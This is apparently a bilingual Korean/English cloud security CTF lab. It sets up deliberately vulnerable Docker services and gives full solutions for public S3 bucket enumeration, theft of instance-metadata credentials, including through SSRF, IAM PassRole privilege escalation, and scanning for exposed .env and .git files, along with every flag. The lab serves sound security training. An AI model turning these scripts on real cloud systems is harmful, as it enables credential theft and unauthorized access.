> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 클라우드 보안 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  # 실습 1: 공개 S3 버킷 시뮬레이션 (MinIO)
  s3-minio:
    image: minio/minio:latest
    container_name: s3-minio
    networks:
      cloud-net:
        ipv4_address: 10.60.10.10
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    command: server /data --console-address ":9001"
    ports:
      - "9000:9000"
      - "9001:9001"
    volumes:
      - minio_data:/data

  # MinIO 버킷 초기화 (공개 버킷 + 플래그 파일)
  s3-init:
    image: minio/mc:latest
    container_name: s3-init
    networks:
      cloud-net:
        ipv4_address: 10.60.10.11
    depends_on:
      - s3-minio
    entrypoint: >
      /bin/sh -c "
        sleep 5 &&
        mc alias set local http://10.60.10.10:9000 minioadmin minioadmin &&
        mc mb local/public-assets --ignore-existing &&
        mc mb local/private-backup --ignore-existing &&
        mc mb local/dev-logs --ignore-existing &&
        echo 'CTF{s3_publ1c_buck3t_3num3r4t10n_flag}' | mc pipe local/public-assets/flag.txt &&
        echo 'CTF{pr1v4t3_back3t_s3cr3t_k3y_l34k}' | mc pipe local/private-backup/secrets.txt &&
        echo 'AWS_ACCESS_KEY=FAKEKEYEXAMPLE000000' | mc pipe local/dev-logs/env.txt &&
        echo 'AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' | mc pipe local/dev-logs/env.txt &&
        mc anonymous set public local/public-assets &&
        echo 'S3 setup complete'
      "

  # 실습 2: 취약한 IAM 메타데이터 서비스
  iam-metadata:
    image: python:3.11-slim
    container_name: iam-metadata
    networks:
      cloud-net:
        ipv4_address: 10.60.10.20
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify
app = Flask(__name__)
CREDS = {
    'AccessKeyId': 'ASIAXXX1234567890',
    'SecretAccessKey': 'fake_secret_key_for_ctf',
    'Token': 'FakeSessionToken123',
    'Expiration': '2099-01-01T00:00:00Z'
}
FLAG = 'CTF{1m4_m3t4d4t4_cr3d3nt14ls_st34l}'
@app.route('/latest/meta-data/')
def meta_root():
    return 'iam/\ninstance-id\nhostname\n'
@app.route('/latest/meta-data/iam/')
def iam_list():
    return 'security-credentials/\n'
@app.route('/latest/meta-data/iam/security-credentials/')
def creds_list():
    return 'ec2-role-ctf\n'
@app.route('/latest/meta-data/iam/security-credentials/ec2-role-ctf')
def get_creds():
    return jsonify({**CREDS, 'flag': FLAG})
@app.route('/latest/meta-data/instance-id')
def instance_id():
    return 'i-0abc123def456789'
app.run('0.0.0.0', 80)
\""
    ports:
      - "8080:80"

  # 실습 3: 과도한 IAM 권한 (권한 상승)
  iam-privesc:
    image: python:3.11-slim
    container_name: iam-privesc
    networks:
      cloud-net:
        ipv4_address: 10.60.10.30
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify
app = Flask(__name__)
ROLES = {
    'dev_role': {
        'policies': ['s3:GetObject', 'iam:PassRole', 'sts:AssumeRole'],
        'token': 'dev_token_abc123',
    },
    'admin_role': {
        'policies': ['*'],
        'token': 'admin_token_xyz789',
        'flag': 'CTF{1am_pr1v3sc_p4ss_r0l3_t0_adm1n}',
    },
}
SECRETS = {'admin_secret': 'CTF{1am_pr1v3sc_p4ss_r0l3_t0_adm1n}'}
@app.route('/sts/assume-role', methods=['POST'])
def assume_role():
    data = request.json or {}
    token = data.get('token', '')
    target_role = data.get('role', '')
    current_role = None
    for role, info in ROLES.items():
        if info['token'] == token:
            current_role = role
            break
    if not current_role:
        return jsonify({'error': 'invalid token'}), 401
    if 'iam:PassRole' in ROLES[current_role]['policies'] or '*' in ROLES[current_role]['policies']:
        if target_role in ROLES:
            new_info = ROLES[target_role]
            return jsonify({'role': target_role, 'token': new_info['token'], 'flag': new_info.get('flag','')})
    return jsonify({'error': 'insufficient permissions'}), 403
@app.route('/secrets/<name>')
def get_secret(name):
    auth = request.headers.get('Authorization','').replace('Bearer ','')
    admin_token = ROLES['admin_role']['token']
    if auth == admin_token:
        val = SECRETS.get(name)
        if val:
            return jsonify({'secret': val})
    return jsonify({'error': 'forbidden'}), 403
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5030:5000"

  # 실습 4: 잘못 구성된 클라우드 스토리지 + 키 노출
  cloud-storage:
    image: python:3.11-slim
    container_name: cloud-storage
    networks:
      cloud-net:
        ipv4_address: 10.60.10.40
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify, send_from_directory
import os, json
app = Flask(__name__)
os.makedirs('/app/public', exist_ok=True)
os.makedirs('/app/private', exist_ok=True)
FLAG1 = 'CTF{cl0ud_st0r4g3_m1sc0nf1g_g1t_l34k}'
FLAG2 = 'CTF{cl0ud_3nv_v4r_s3cr3t_3xp0s3d}'
# 실수로 노출된 .env 파일
with open('/app/public/.env', 'w') as f:
    f.write(f'DB_PASSWORD=secretpass123\nAPI_KEY=sk-live-xxxx\nFLAG={FLAG1}\n')
# 실수로 노출된 .git/config
os.makedirs('/app/public/.git', exist_ok=True)
with open('/app/public/.git/config', 'w') as f:
    f.write('[core]\n    repositoryformatversion = 0\n')
with open('/app/public/.git/COMMIT_EDITMSG', 'w') as f:
    f.write(f'fix: removed hardcoded credentials\n\nFLAG={FLAG1}')
@app.route('/files/<path:filename>')
def serve_file(filename):
    return send_from_directory('/app/public', filename)
@app.route('/env')
def env_endpoint():
    return jsonify({'FLAG': FLAG2, 'note': 'internal env vars exposed'})
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5040:5000"

  # 공격자 머신
  attacker:
    image: python:3.11-slim
    container_name: attacker
    networks:
      cloud-net:
        ipv4_address: 10.60.10.100
    command: >
      sh -c "pip install boto3 requests -q && sleep infinity"
    tty: true

volumes:
  minio_data:

networks:
  cloud-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.60.10.0/24
```

환경 시작:

```bash
docker compose up -d
# MinIO 초기화 완료 대기 (약 10초)
sleep 10
docker exec -it attacker bash
```

---

## 실습 1: 공개 S3 버킷 열거 및 파일 다운로드

### 목표
잘못 설정된 공개 S3 버킷(MinIO)을 발견하고, 버킷 내 파일을 열거해 민감한 정보와 플래그를 획득한다.

**플래그 형식**: `CTF{s3_publ1c_buck3t_3num3r4t10n_flag}`

### 시나리오
`10.60.10.10:9000`에 MinIO 서버가 실행 중이다. `public-assets`, `private-backup`, `dev-logs` 세 개의 버킷이 있으며 일부는 공개 접근이 허용되어 있다. 버킷을 열거하고 모든 접근 가능한 파일을 다운로드하라.

### 힌트
1. S3 API는 기본적으로 XML 응답을 반환한다. `GET /{bucket}` 으로 목록을 조회한다.
2. 공개 버킷은 인증 없이 접근 가능하다.
3. MinIO 콘솔은 포트 9001에서 접근 가능하다 (admin/admin).
4. `boto3`나 `aws cli` 없이도 순수 HTTP 요청으로 접근 가능하다.
5. `aws s3 ls s3://public-assets --endpoint-url http://10.60.10.10:9000 --no-sign-request`

### 풀이

**1단계: 수동 S3 API 탐색**

```bash
# 공개 버킷 목록 조회
curl -s http://10.60.10.10:9000/public-assets/ | python3 -c "
import sys
data = sys.stdin.read()
print(data[:2000])
"

# 버킷 내 파일 다운로드
curl -s http://10.60.10.10:9000/public-assets/flag.txt
```

**2단계: boto3 자동화 탐색**

```python
#!/usr/bin/env python3
"""
실습 1: S3 버킷 열거 및 민감 파일 다운로드
"""
import argparse
import sys
from io import BytesIO
from typing import Iterator

try:
    import boto3
    from botocore.exceptions import ClientError, NoCredentialsError
    from botocore.config import Config
except ImportError:
    print("[-] boto3 필요: pip install boto3")
    sys.exit(1)

import requests
from requests.exceptions import RequestException


KNOWN_BUCKETS = [
    "public-assets",
    "private-backup",
    "dev-logs",
    "backup",
    "data",
    "assets",
    "logs",
    "config",
    "secrets",
]


def create_s3_client(endpoint: str, use_auth: bool = False):
    """S3 클라이언트를 생성한다."""
    kwargs: dict = {
        "endpoint_url": endpoint,
        "config": Config(signature_version="s3v4"),
        "region_name": "us-east-1",
    }
    if not use_auth:
        import botocore
        kwargs["aws_access_key_id"] = "anonymous"
        kwargs["aws_secret_access_key"] = "anonymous"
    return boto3.client("s3", **kwargs)


def list_bucket_public(endpoint: str, bucket: str) -> list[dict]:
    """공개 버킷의 객체 목록을 가져온다."""
    url = f"{endpoint}/{bucket}/"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code in (200, 403):
            print(f"[+] 버킷 응답: {bucket} -> HTTP {resp.status_code}")
            if resp.status_code == 200 and "<Key>" in resp.text:
                # XML 파싱
                import re
                keys = re.findall(r"<Key>([^<]+)</Key>", resp.text)
                sizes = re.findall(r"<Size>([^<]+)</Size>", resp.text)
                return [{"Key": k, "Size": s} for k, s in zip(keys, sizes)]
        elif resp.status_code == 404:
            pass  # 버킷 없음
    except RequestException as e:
        print(f"[-] {bucket}: {e}")
    return []


def download_file_public(endpoint: str, bucket: str, key: str) -> bytes | None:
    """공개 버킷에서 파일을 다운로드한다."""
    url = f"{endpoint}/{bucket}/{key}"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.content
    except RequestException:
        pass
    return None


def enumerate_buckets(endpoint: str) -> None:
    """알려진 버킷 이름 목록으로 브루트포스 탐색을 수행한다."""
    print(f"[*] 버킷 열거 시작: {endpoint}")
    import re

    for bucket in KNOWN_BUCKETS:
        objects = list_bucket_public(endpoint, bucket)

        if not objects:
            continue

        print(f"\n[+] 접근 가능한 버킷: {bucket} ({len(objects)}개 파일)")
        for obj in objects:
            key = obj.get("Key", "")
            size = obj.get("Size", "?")
            print(f"  - {key} ({size} bytes)")

            content = download_file_public(endpoint, bucket, key)
            if content:
                text = content.decode(errors="replace").strip()
                import re as _re
                flags = _re.findall(r"CTF\{[^}]+\}", text)
                if flags:
                    print(f"  [!] 플래그 발견: {flags}")
                elif len(text) < 500:
                    print(f"  [*] 내용: {text[:200]}")
                else:
                    print(f"  [*] 바이너리/대용량 파일")


def try_authenticated(endpoint: str, access_key: str, secret_key: str) -> None:
    """자격증명으로 비공개 버킷에 접근을 시도한다."""
    print(f"\n[*] 인증 접근 시도: {access_key}")
    try:
        client = boto3.client(
            "s3",
            endpoint_url=endpoint,
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name="us-east-1",
        )
        buckets = client.list_buckets()
        print(f"[+] 버킷 목록: {[b['Name'] for b in buckets.get('Buckets', [])]}")

        for bucket_info in buckets.get("Buckets", []):
            bname = bucket_info["Name"]
            try:
                objects = client.list_objects_v2(Bucket=bname)
                for obj in objects.get("Contents", []):
                    key = obj["Key"]
                    data = client.get_object(Bucket=bname, Key=key)["Body"].read()
                    text = data.decode(errors="replace").strip()
                    import re
                    flags = re.findall(r"CTF\{[^}]+\}", text)
                    if flags:
                        print(f"  [!] {bname}/{key}: {flags}")
            except ClientError:
                pass
    except Exception as e:
        print(f"[-] 인증 접근 실패: {e}")


def main() -> None:
    parser = argparse.ArgumentParser(description="S3 버킷 열거 및 파일 다운로드")
    parser.add_argument("--endpoint", default="http://10.60.10.10:9000")
    parser.add_argument("--access-key", default=None, help="AWS 액세스 키")
    parser.add_argument("--secret-key", default=None, help="AWS 시크릿 키")
    args = parser.parse_args()

    # 1. 공개 버킷 열거
    enumerate_buckets(args.endpoint)

    # 2. 자격증명 있으면 비공개 버킷도 접근
    if args.access_key and args.secret_key:
        try_authenticated(args.endpoint, args.access_key, args.secret_key)


if __name__ == "__main__":
    main()
```

실행:
```bash
# 공개 버킷 열거
python3 cloud_s3_enum.py --endpoint http://10.60.10.10:9000

# MinIO 관리자 자격증명으로 전체 접근
python3 cloud_s3_enum.py --endpoint http://10.60.10.10:9000 \
  --access-key minioadmin --secret-key minioadmin
```

---

## 실습 2: EC2 인스턴스 메타데이터 서비스(IMDS) 자격증명 탈취

### 목표
취약한 SSRF 또는 잘못 설정된 IMDS 접근을 통해 EC2 인스턴스 역할의 임시 자격증명을 탈취한다.

**플래그 형식**: `CTF{1m4_m3t4d4t4_cr3d3nt14ls_st34l}`

### 시나리오
`10.60.10.20:80`은 EC2 인스턴스 메타데이터 서비스(IMDSv1)를 시뮬레이션한다. SSRF가 가능한 환경에서 `http://169.254.169.254/` (또는 이 랩에서는 `http://10.60.10.20/`) 에 접근해 IAM 역할의 임시 자격증명을 획득한다.

### 힌트
1. IMDS 경로: `/latest/meta-data/iam/security-credentials/`
2. 먼저 역할 이름을 조회하고, 그 이름으로 자격증명을 요청한다.
3. `GET /latest/meta-data/iam/security-credentials/{role_name}`
4. IMDSv2는 `PUT /latest/api/token`으로 토큰을 먼저 받아야 한다.
5. 획득한 `AccessKeyId`, `SecretAccessKey`, `Token`으로 AWS API를 호출할 수 있다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 2: IMDS 자격증명 탈취
"""
import argparse
import sys
import re

import requests
from requests.exceptions import RequestException


IMDS_BASE_DEFAULT = "http://10.60.10.20"


def get_imds(base_url: str, path: str, token: str | None = None) -> str | None:
    """IMDS 엔드포인트에서 메타데이터를 가져온다."""
    headers = {}
    if token:
        headers["X-aws-ec2-metadata-token"] = token
    try:
        resp = requests.get(f"{base_url}{path}", headers=headers, timeout=5)
        if resp.status_code == 200:
            return resp.text.strip()
    except RequestException as e:
        print(f"[-] IMDS 요청 실패 ({path}): {e}")
    return None


def get_imdsv2_token(base_url: str) -> str | None:
    """IMDSv2 세션 토큰을 획득한다."""
    try:
        resp = requests.put(
            f"{base_url}/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=5,
        )
        if resp.status_code == 200:
            token = resp.text.strip()
            print(f"[+] IMDSv2 토큰 획득: {token[:20]}...")
            return token
    except RequestException:
        pass
    print("[*] IMDSv2 미지원, IMDSv1으로 시도")
    return None


def steal_credentials(base_url: str) -> dict | None:
    """IMDS에서 IAM 역할 자격증명을 탈취한다."""
    print(f"[*] IMDS 자격증명 탈취 시작: {base_url}")

    # IMDSv2 토큰 시도 (있으면 사용)
    token = get_imdsv2_token(base_url)

    # 1. 인스턴스 기본 정보
    instance_id = get_imds(base_url, "/latest/meta-data/instance-id", token)
    print(f"[*] 인스턴스 ID: {instance_id}")

    # 2. IAM 역할 목록
    iam_path = "/latest/meta-data/iam/security-credentials/"
    roles_text = get_imds(base_url, iam_path, token)
    if not roles_text:
        print("[-] IAM 역할 없음 또는 접근 불가")
        return None

    roles = [r.strip() for r in roles_text.splitlines() if r.strip()]
    print(f"[+] 발견된 IAM 역할: {roles}")

    # 3. 각 역할의 자격증명 획득
    all_creds = {}
    for role in roles:
        cred_path = f"{iam_path}{role}"
        cred_text = get_imds(base_url, cred_path, token)
        if cred_text:
            try:
                import json
                creds = json.loads(cred_text)
                all_creds[role] = creds
                print(f"\n[+] 역할 '{role}' 자격증명 탈취!")
                print(f"  AccessKeyId:     {creds.get('AccessKeyId')}")
                print(f"  SecretAccessKey: {creds.get('SecretAccessKey')}")
                print(f"  Token:           {creds.get('Token', '')[:30]}...")
                if "flag" in creds:
                    print(f"\n  [!] 플래그: {creds['flag']}")
            except Exception:
                print(f"[*] 역할 '{role}' 원시 응답: {cred_text[:200]}")

    return all_creds if all_creds else None


def check_ssrf_via_fetch(ssrf_endpoint: str, imds_url: str) -> None:
    """SSRF 취약한 엔드포인트를 통해 IMDS에 간접 접근한다."""
    print(f"\n[*] SSRF를 통한 IMDS 접근: {ssrf_endpoint}")
    imds_paths = [
        f"{imds_url}/latest/meta-data/iam/security-credentials/",
        f"{imds_url}/latest/meta-data/instance-id",
    ]
    for path in imds_paths:
        try:
            resp = requests.get(
                ssrf_endpoint,
                params={"url": path},
                timeout=8,
            )
            data = resp.json()
            body = data.get("body", "")
            print(f"  [+] {path}: {body[:200]}")
            flags = re.findall(r"CTF\{[^}]+\}", body)
            if flags:
                print(f"  [!] 플래그: {flags[0]}")
        except RequestException as e:
            print(f"  [-] {path}: {e}")


def main() -> None:
    parser = argparse.ArgumentParser(description="IMDS 자격증명 탈취")
    parser.add_argument("--imds", default=IMDS_BASE_DEFAULT, help="IMDS 베이스 URL")
    parser.add_argument("--ssrf-endpoint", default=None, help="SSRF 취약 엔드포인트 URL")
    args = parser.parse_args()

    if args.ssrf_endpoint:
        check_ssrf_via_fetch(args.ssrf_endpoint, args.imds)
    else:
        steal_credentials(args.imds)


if __name__ == "__main__":
    main()
```

실행:
```bash
# 직접 IMDS 접근
python3 cloud_imds.py --imds http://10.60.10.20

# SSRF를 통한 간접 접근 (실습 2 SSRF 앱이 있다면)
python3 cloud_imds.py --ssrf-endpoint http://10.50.10.20:5000/fetch \
  --imds http://10.60.10.20
```

---

## 실습 3: IAM 권한 상승 — PassRole 악용

### 목표
`iam:PassRole` 권한을 가진 낮은 권한의 IAM 역할에서 `sts:AssumeRole`을 이용해 관리자 역할을 탈취하고 플래그를 획득한다.

**플래그 형식**: `CTF{1am_pr1v3sc_p4ss_r0l3_t0_adm1n}`

### 시나리오
개발자 토큰(`dev_token_abc123`)이 유출됐다. 이 토큰의 역할은 `s3:GetObject`, `iam:PassRole`, `sts:AssumeRole` 권한을 갖는다. `iam:PassRole`과 `sts:AssumeRole`을 조합해 `admin_role`을 획득한다.

### 힌트
1. 현재 역할의 권한을 확인한다.
2. `iam:PassRole`은 다른 역할을 서비스에 위임하는 권한이다.
3. `sts:AssumeRole`로 `admin_role`을 직접 획득 시도한다.
4. POST `/sts/assume-role`에 `token`과 `role`을 전송한다.
5. admin 토큰으로 `/secrets/admin_secret`에 접근한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 3: IAM PassRole 권한 상승
"""
import argparse
import sys

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.60.10.30:5000"
DEV_TOKEN = "dev_token_abc123"


def assume_role(base_url: str, current_token: str, target_role: str) -> dict | None:
    """sts:AssumeRole API로 새 역할을 획득한다."""
    print(f"[*] 역할 전환 시도: {target_role}")
    try:
        resp = requests.post(
            f"{base_url}/sts/assume-role",
            json={"token": current_token, "role": target_role},
            timeout=5,
        )
        if resp.status_code == 200:
            data = resp.json()
            print(f"[+] 역할 획득 성공: {data}")
            return data
        else:
            print(f"[-] 역할 전환 실패: {resp.status_code} {resp.text}")
    except RequestException as e:
        print(f"[-] 요청 실패: {e}")
    return None


def get_secret(base_url: str, token: str, secret_name: str) -> str | None:
    """admin 토큰으로 비밀값을 조회한다."""
    try:
        resp = requests.get(
            f"{base_url}/secrets/{secret_name}",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )
        if resp.status_code == 200:
            data = resp.json()
            print(f"[+] 비밀값 획득: {data}")
            return data.get("secret")
        else:
            print(f"[-] 비밀값 접근 실패: {resp.status_code}")
    except RequestException as e:
        print(f"[-] 요청 실패: {e}")
    return None


def privesc_chain(base_url: str, dev_token: str) -> None:
    """IAM 권한 상승 전체 체인."""
    print(f"[*] 대상: {base_url}")
    print(f"[*] 초기 토큰: {dev_token}\n")

    # 1. 일반 역할로 admin_role 획득 시도
    target_roles = ["admin_role", "admin", "root", "superuser"]

    for role in target_roles:
        result = assume_role(base_url, dev_token, role)
        if result:
            admin_token = result.get("token", "")
            flag_inline = result.get("flag", "")

            if flag_inline:
                print(f"\n[!] 인라인 플래그: {flag_inline}")

            if admin_token:
                print(f"[*] admin 토큰 획득: {admin_token}")

                # 2. admin 토큰으로 비밀값 조회
                secret_names = ["admin_secret", "flag", "root_flag", "master_key"]
                for secret in secret_names:
                    val = get_secret(base_url, admin_token, secret)
                    if val:
                        import re
                        flags = re.findall(r"CTF\{[^}]+\}", val)
                        if flags:
                            print(f"\n[!] 최종 플래그: {flags[0]}")
                            return
                return

    print("[-] 모든 역할 전환 실패")


def main() -> None:
    parser = argparse.ArgumentParser(description="IAM PassRole 권한 상승")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    parser.add_argument("--token", default=DEV_TOKEN, help="초기 IAM 토큰")
    args = parser.parse_args()
    privesc_chain(args.url, args.token)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 cloud_iam_privesc.py --url http://10.60.10.30:5000 --token dev_token_abc123
```

---

## 실습 4: 클라우드 스토리지 설정 오류 — .env 파일 및 Git 히스토리 노출

### 목표
잘못 설정된 클라우드 스토리지에서 `.env` 파일과 `.git` 디렉터리를 발견하고 노출된 자격증명과 플래그를 수집한다.

**플래그 형식 1**: `CTF{cl0ud_st0r4g3_m1sc0nf1g_g1t_l34k}`
**플래그 형식 2**: `CTF{cl0ud_3nv_v4r_s3cr3t_3xp0s3d}`

### 시나리오
`10.60.10.40:5000`의 파일 서비스가 공개 디렉터리를 서빙한다. 실수로 `.env`, `.git/config`, `.git/COMMIT_EDITMSG` 파일이 포함되어 있다. 일반 웹 크롤러로 이런 파일들을 자동으로 탐지하는 스크립트를 작성한다.

### 힌트
1. `.env`, `.git/config`, `.git/COMMIT_EDITMSG`, `.git/logs/HEAD` 등의 경로를 직접 요청한다.
2. 200 응답이면 파일이 공개되어 있는 것이다.
3. Git 히스토리에 비밀번호나 API 키가 남아 있을 수 있다.
4. `/env` 엔드포인트는 환경 변수를 직접 노출할 수 있다.
5. 발견한 자격증명으로 다른 서비스 접근을 시도한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 4: 클라우드 스토리지 설정 오류 — 민감 파일 탐지
"""
import argparse
import re
import sys
import concurrent.futures

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.60.10.40:5000"

SENSITIVE_PATHS = [
    "/files/.env",
    "/files/.env.local",
    "/files/.env.production",
    "/files/.env.backup",
    "/files/.git/config",
    "/files/.git/COMMIT_EDITMSG",
    "/files/.git/logs/HEAD",
    "/files/.git/FETCH_HEAD",
    "/files/config.php",
    "/files/wp-config.php",
    "/files/config.yaml",
    "/files/secrets.json",
    "/files/credentials.json",
    "/env",
    "/config",
    "/debug",
    "/admin",
    "/status",
]


def check_path(base_url: str, path: str) -> tuple[str, int, str]:
    """경로의 HTTP 응답 상태와 내용을 반환한다."""
    try:
        resp = requests.get(f"{base_url}{path}", timeout=5)
        return path, resp.status_code, resp.text
    except RequestException as e:
        return path, 0, str(e)


def scan_sensitive_files(base_url: str) -> list[dict]:
    """민감한 파일 경로를 병렬 탐색한다."""
    print(f"[*] 민감 파일 탐색 시작: {base_url}")
    findings = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(check_path, base_url, path): path
            for path in SENSITIVE_PATHS
        }
        for future in concurrent.futures.as_completed(futures):
            path, status, body = future.result()
            if status == 200:
                print(f"[+] 발견: {path} (HTTP {status})")
                finding = {
                    "path": path,
                    "status": status,
                    "body": body[:1000],
                }

                # 민감 정보 패턴 탐지
                patterns = {
                    "flag": r"CTF\{[^}]+\}",
                    "api_key": r"(?:api[_-]?key|apikey)\s*[=:]\s*\S+",
                    "password": r"(?:password|passwd|pwd)\s*[=:]\s*\S+",
                    "secret": r"(?:secret|token)\s*[=:]\s*\S+",
                    "aws_key": r"(?:AKIA|ASIA)[0-9A-Z]{16}",
                }

                for pattern_name, pattern in patterns.items():
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    if matches:
                        print(f"  [!] {pattern_name.upper()} 발견: {matches[:3]}")
                        finding[pattern_name] = matches

                findings.append(finding)
            elif status == 403:
                print(f"[-] 접근 금지: {path}")

    return findings


def extract_secrets_from_git(base_url: str) -> None:
    """Git 관련 파일에서 비밀 정보를 추출한다."""
    git_paths = [
        "/files/.git/config",
        "/files/.git/COMMIT_EDITMSG",
        "/files/.git/logs/HEAD",
        "/files/.git/HEAD",
    ]
    print("\n[*] Git 파일에서 비밀 정보 추출...")
    for path in git_paths:
        _, status, body = check_path(base_url, path)
        if status == 200:
            print(f"[+] {path}:")
            print(f"{body[:500]}\n")
            flags = re.findall(r"CTF\{[^}]+\}", body)
            if flags:
                print(f"  [!] 플래그: {flags}")


def report_findings(findings: list[dict]) -> None:
    """발견된 취약점을 보고서 형식으로 정리한다."""
    print(f"\n{'='*60}")
    print("[*] 클라우드 스토리지 취약점 보고서")
    print(f"{'='*60}")
    print(f"발견된 취약 경로: {len(findings)}개\n")

    all_flags = []
    all_creds = []

    for f in findings:
        print(f"경로: {f['path']}")
        if "flag" in f:
            for flag in f["flag"]:
                all_flags.append(flag)
                print(f"  -> 플래그: {flag}")
        for key in ["password", "api_key", "secret", "aws_key"]:
            if key in f:
                for cred in f[key]:
                    all_creds.append({"type": key, "value": cred})
                    print(f"  -> {key.upper()}: {cred}")
        print()

    if all_flags:
        print(f"[!] 총 {len(all_flags)}개 플래그 획득:")
        for flag in all_flags:
            print(f"    {flag}")

    if all_creds:
        print(f"\n[!] 노출된 자격증명 {len(all_creds)}개:")
        for cred in all_creds:
            print(f"    [{cred['type']}] {cred['value']}")


def main() -> None:
    parser = argparse.ArgumentParser(description="클라우드 스토리지 설정 오류 탐지")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    args = parser.parse_args()

    findings = scan_sensitive_files(args.url)
    extract_secrets_from_git(args.url)
    report_findings(findings)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 cloud_misconfig.py --url http://10.60.10.40:5000
```

---

<a name="english"></a>

# Cloud Security CTF Practice Lab

## Lab Environment Setup

Use the `docker-compose.yml` from the Korean section. Start with:

```bash
docker compose up -d
sleep 10   # Wait for MinIO bucket initialization
docker exec -it attacker bash
```

---

## Challenge 1: Public S3 Bucket Enumeration and File Download

### Objective
Discover misconfigured public S3 buckets (via MinIO), enumerate all accessible files, and retrieve the hidden flag.

**Flag format**: `CTF{s3_publ1c_buck3t_3num3r4t10n_flag}`

### Scenario
MinIO is running at `10.60.10.10:9000` with three buckets: `public-assets`, `private-backup`, and `dev-logs`. Some are publicly accessible. Enumerate buckets and download all accessible files.

### Hints
1. The S3 API returns XML listings at `GET /{bucket}/`.
2. Public buckets require no authentication.
3. MinIO console is at port 9001 (admin/admin).
4. Pure HTTP requests work without `aws cli` or `boto3`.
5. `aws s3 ls s3://public-assets --endpoint-url http://10.60.10.10:9000 --no-sign-request`

### Solution

```bash
# Manual
curl -s http://10.60.10.10:9000/public-assets/ | grep -oP '(?<=<Key>)[^<]+'
curl -s http://10.60.10.10:9000/public-assets/flag.txt

# Automated
python3 cloud_s3_enum.py --endpoint http://10.60.10.10:9000

# With credentials (to access private buckets)
python3 cloud_s3_enum.py --endpoint http://10.60.10.10:9000 \
  --access-key minioadmin --secret-key minioadmin
```

---

## Challenge 2: EC2 IMDS Credential Theft

### Objective
Access the Instance Metadata Service (IMDS) to steal IAM role temporary credentials.

**Flag format**: `CTF{1m4_m3t4d4t4_cr3d3nt14ls_st34l}`

### Scenario
`10.60.10.20:80` simulates EC2 IMDSv1. Enumerate IAM roles via `/latest/meta-data/iam/security-credentials/` and retrieve the credentials JSON, which contains the flag.

### Hints
1. IMDS path: `/latest/meta-data/iam/security-credentials/`
2. First request the path above to get the role name.
3. Then request `/latest/meta-data/iam/security-credentials/{role_name}`.
4. IMDSv2 requires a `PUT` to get a token first.
5. The returned JSON includes `AccessKeyId`, `SecretAccessKey`, `Token`.

### Solution

```bash
# Manual
curl http://10.60.10.20/latest/meta-data/iam/security-credentials/
curl http://10.60.10.20/latest/meta-data/iam/security-credentials/ec2-role-ctf

# Automated
python3 cloud_imds.py --imds http://10.60.10.20

# Via SSRF (if a fetch endpoint is available)
curl "http://10.50.10.20:5000/fetch?url=http://10.60.10.20/latest/meta-data/iam/security-credentials/ec2-role-ctf"
```

---

## Challenge 3: IAM Privilege Escalation via PassRole

### Objective
Use a leaked developer token with `iam:PassRole` to assume the `admin_role` and read the protected secret.

**Flag format**: `CTF{1am_pr1v3sc_p4ss_r0l3_t0_adm1n}`

### Scenario
A developer token (`dev_token_abc123`) was leaked. The associated role has `iam:PassRole` and `sts:AssumeRole`. Use these to escalate to `admin_role` and access the protected `/secrets/admin_secret`.

### Hints
1. Review the current role's permissions.
2. `iam:PassRole` allows delegating a role to a service.
3. Use `sts:AssumeRole` to assume `admin_role`.
4. POST `{"token": "dev_token_abc123", "role": "admin_role"}` to `/sts/assume-role`.
5. Use the returned admin token against `/secrets/admin_secret`.

### Solution

```bash
python3 cloud_iam_privesc.py --url http://10.60.10.30:5000 --token dev_token_abc123

# Manual
curl -s -X POST http://10.60.10.30:5000/sts/assume-role \
  -H "Content-Type: application/json" \
  -d '{"token":"dev_token_abc123","role":"admin_role"}'
# Then use the returned token:
curl -H "Authorization: Bearer admin_token_xyz789" \
  http://10.60.10.30:5000/secrets/admin_secret
```

---

## Challenge 4: Cloud Storage Misconfiguration — .env and Git Exposure

### Objective
Discover a misconfigured file server that exposes `.env` and `.git` files, and extract credentials and flags from them.

**Flag 1**: `CTF{cl0ud_st0r4g3_m1sc0nf1g_g1t_l34k}`
**Flag 2**: `CTF{cl0ud_3nv_v4r_s3cr3t_3xp0s3d}`

### Scenario
The file service at `10.60.10.40:5000` accidentally exposes `.env`, `.git/config`, and `.git/COMMIT_EDITMSG`. Write a scanner to automatically detect these common misconfigurations.

### Hints
1. Directly request `.env`, `.git/config`, `.git/COMMIT_EDITMSG`.
2. HTTP 200 means the file is publicly accessible.
3. Git commit history often contains hardcoded credentials.
4. The `/env` endpoint may expose environment variables directly.
5. Use discovered credentials to pivot to other services.

### Solution

```bash
# Manual
curl http://10.60.10.40:5000/files/.env
curl http://10.60.10.40:5000/files/.git/COMMIT_EDITMSG
curl http://10.60.10.40:5000/env

# Automated scanner
python3 cloud_misconfig.py --url http://10.60.10.40:5000
```

